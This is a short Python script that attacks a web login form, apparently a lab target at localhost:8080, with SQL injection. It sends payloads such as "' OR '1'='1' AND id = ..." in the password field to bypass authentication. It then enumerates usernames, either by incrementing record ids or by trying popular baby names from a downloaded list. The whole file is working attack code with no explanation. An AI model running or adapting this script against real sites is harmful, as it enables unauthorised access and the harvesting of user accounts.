import pandas
import httpx
from tqdm import tqdm
from bs4 import BeautifulSoup


def get_names():
    names_data_url = r"https://github.com/aruljohn/popular-baby-names/raw/master/2000/girl_boy_names_2000.csv"
    names = pandas.read_csv(names_data_url)
    return set(
        (*names["Girl Name"].str.lower()[:300], *names["Boy Name"].str.lower()[:300])
    )


def find_users_by_pk(login_url):
    found_users = []
    pk = 1
    progress = tqdm(unit="request", leave=False)
    while True:
        response = httpx.post(
            login_url,
            data={"username": "", "password": f"' OR '1'='1' AND id = '{pk}"},
        )
        if "Login Failed" not in response.text:
            soup = BeautifulSoup(response.text, "lxml")
            username = soup.find("strong").text
            found_users.append(username)
        else:
            tqdm.write("Last user found; bailing out")
            progress.update()
            break
        pk += 1

        progress.update()

    progress.close()

    return found_users


def find_users_by_name(names, login_url, max_users_to_find=2):
    found_users = []

    for name in tqdm(names, unit="name"):
        name = name.lower()
        response = httpx.post(
            login_url,
            data={"username": name, "password": f"' OR '1'='1' AND username = '{name}"},
        )
        if "Login Failed" not in response.text:
            tqdm.write(f"Found user: {name}")
            found_users.append(name)
            if len(found_users) >= max_users_to_find:
                tqdm.write(f"Found {len(found_users)} users; bailing out early")
                break

    return found_users


def main():
    login_url = "http://localhost:8080/login"
    # names = get_names()
    # found_users = find_users_by_name(names, login_url)
    found_users = find_users_by_pk(login_url)
    print("Found users:")
    for user in found_users:
        print(f"  {user}")


if __name__ == "__main__":
    main()
